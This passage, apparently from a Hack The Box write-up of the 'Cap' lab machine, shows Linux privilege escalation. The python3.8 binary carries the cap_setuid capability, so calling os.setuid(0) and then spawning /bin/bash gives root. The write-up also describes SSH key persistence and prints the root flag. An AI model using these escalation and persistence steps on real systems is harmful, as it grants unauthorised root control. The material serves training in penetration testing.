+</span><span class="z-source z-python">    <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">redirect</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">/data/<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-type z-python">str</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">pcapid</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span></code></pre>
+<p>In order to create a <code>.pcap</code> file, it calls <code>tcpdump</code> with a 5 seconds timeout
+using <code>os.system</code>. It calls <code>os.setuid(0)</code> prior to this command to get <code>root</code>.</p>
+<p>I looked for a command injection vulnerability, but unfortunately none of the
+variables passed in the command are user-controllable.</p>
+<p>Weirdly, if we run <code>pspy</code> and browse to <code>http://10.10.10.245/capture</code>, here's
+the result:</p>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">2024/01/21 09:04:25 CMD: UID=1001  PID=2455   | sh -c python3 -c &#39;import os; os.setuid(0); os.system(&quot;timeout 5 tcpdump -w /var/www/html/upload/1.pcap -i any host 10.10.14.9&quot;)&#39;
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>This command is ran by the user with UID <code>1001</code>. Who is that?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> awk<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span>: <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>$3 == 1001 {print $1}<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">nathan
+</span></code></pre>
+<p>That's us! We shouldn't be able to set our UID to <code>0</code> though.</p>
+<h3 id="inspecting-app-py-and-usr-bin-python3">Inspecting <code>app.py</code> and <code>/usr/bin/python3</code></h3>
+<p>Let's check the permissions of <code>app.py</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/var/www/html/app.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">-rw-r--r-- 1 nathan nathan 4293 May 25  2021 /var/www/html/app.py
+</span></code></pre>
+<p>It's normal. What about <code>/usr/bin/python3</code>?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">lrwxrwxrwx 1 root root 9 Mar 13  2020 /usr/bin/python3 -&gt; python3.8
+</span></code></pre>
+<p>It's a symlink to <code>/usr/bin/python3.8</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3.8<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">-rwxr-xr-x 1 root root 5486384 Jan 27  2021 /usr/bin/python3.8
+</span></code></pre>
+<p>The permissions are also classic. There must be something else then.</p>
+<p>Let's check the capabilities of these files.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> getcap <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/var/www/html/app.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Nothing.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> getcap <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3.8<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+</span></code></pre>
+<p>The <code>/usr/bin/python3.8</code> binary has two capabilities set: <code>cap_setuid</code> and
+<code>cap_net_bind_service+eip</code>!</p>
+<h2 id="privilege-escalation-capabilities">Privilege escalation (Capabilities)</h2>
+<p>Linux capabilities are a way to divide privileges into distinct units. This
+helps in giving a process only the privileges it needs to perform its task,
+rather than giving it full superuser privileges.</p>
+<p>The <code>cap_setuid</code> capability allows a process to change its own user ID to any
+other user ID, while the <code>cap_net_bind_service</code> capability allows a process to
+bind to privileged ports.</p>
+<p>Since the <code>cap_setuid</code> is set on <code>/usr/bin/python3.8</code>, we can execute this binary
+and change our UID!</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let's open a Python session:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> /usr/bin/python3.8</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">&gt;&gt;&gt;
+</span></code></pre>
+<p>Then, let's import the <code>os</code> library.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> import <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">os</span></span>
+</span></code></pre>
+<p>Now let's set the UID of the process to <code>root</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> os.setuid<span class="z-punctuation z-definition z-compound z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">0</span></span><span class="z-punctuation z-definition z-compound z-end z-shell">)</span>
+</span></code></pre>
+<p>Finally, we can open a shell:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> os.system<span class="z-punctuation z-definition z-compound z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/bin/bash -i<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span></span><span class="z-punctuation z-definition z-compound z-end z-shell">)</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root@cap:~#
+</span></code></pre>
+<p>Yay!</p>
+<h3 id="establishing-persistence">Establishing persistence</h3>
+<p>Let's use SSH to establish persistence.</p>
+<p>Our home folder contains a <code>.ssh</code> folder. There's no existing private key, so
+I'll create one, and I'll add the corresponding public key to <code>authorized_keys</code>.
+Finally, I'll connect over SSH to Cap as <code>root</code>.</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">2c68ffb67376ed8e9fc7798df93b2f40
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/cap/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated the user flag as 'Easy' and the root flag as 'Very easy'. The foothold
+was a bit tricky to find, but trivial to exploit. The privilege escalation only
+required proper enumeration to identify and was easy to take advantage of.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
